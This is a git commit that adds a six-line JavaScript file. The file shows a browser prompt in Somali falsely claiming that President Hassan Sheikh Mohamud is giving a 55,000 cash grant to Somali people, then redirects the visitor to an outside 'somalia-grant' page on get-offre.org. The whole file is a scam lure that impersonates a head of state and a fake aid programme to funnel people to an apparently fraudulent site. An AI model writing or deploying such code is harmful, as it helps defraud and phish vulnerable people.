5a0d215c35a66e87983daeacd411a3b24920aeb9
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-11 22:38:04 -0800

    Create somalia-active.js

---
+++ somalia-active.js
@@ -0,0 +1,6 @@
+
+var password = 'KA TIRSAN'
+password=prompt('SMS: Hambalyo Waxaad u qalantaa Madaxweyne XASAN SHEEKH MOHAMUD SOS55,000 oo deeq lacageed ah oo loogu talagalay dadka Soomaaliyeed.   ','KA TIRSAN');
+if (password != 'KA TIRSAN') {
+location.href='https://get-offre.org/somalia-grant.html';
+}
